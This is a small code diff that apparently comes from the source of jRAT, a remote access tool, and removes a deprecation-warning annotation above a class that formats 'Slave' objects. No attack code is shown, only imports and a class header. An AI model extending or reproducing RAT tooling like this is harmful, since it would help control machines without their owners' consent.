@@ -14,7 +14,6 @@ import pro.jrat.api.Reader;
 import pro.jrat.api.Writer;
 import pro.jrat.packets.outgoing.AbstractOutgoingPacket;
 
-@SuppressWarnings("deprecation")
 public class RATObjectFormat {
 
 	public static RATObject format(final Slave s) {
